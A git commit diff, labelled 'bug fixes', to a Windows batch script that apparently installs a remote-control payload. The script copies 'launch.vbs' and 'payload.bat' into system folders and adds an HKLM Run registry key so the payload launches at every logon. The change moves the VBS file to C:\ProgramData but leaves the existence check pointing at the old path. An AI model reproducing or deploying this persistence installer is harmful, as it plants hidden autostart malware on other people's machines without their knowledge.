70e0c876e362c752d77df4087dc70b97971c4d61
Guest257351 <lukenicholls510@gmail.com>
2021-03-25 10:42:41 +1030

    bug fixes

--- RC_yes_admin.bat
+++ RC_yes_admin.bat
@@ -6,11 +6,11 @@
         goto no_admin
     )
     :AT
-copy "payload\launch.vbs" "C:\users" >nul
+copy "payload\launch.vbs" "C:\ProgramData" >nul
 if exist "C:\users\launch.vbs" (echo [92msuccessfuly moved launch.vbs[0m) else (echo [31mfailed to move launch.vbs[0m)
 copy "payload\payload.bat"  "C:\users\%username%\AppData" >nul
 if exist "C:\users\%username%\AppData\payload.bat" (echo [92msuccessfuly moved payload.bat[0m) else (echo [31mfailed to move payload.bat[0m)
-REG ADD HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run /v payload /t REG_SZ /d C:\users\launch.vbs
+REG ADD HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run /v payload /t REG_SZ /d C:\ProgramData\launch.vbs
 echo [92msuccessfuly modified HKLM registry[0m
 pause >nul
 exit
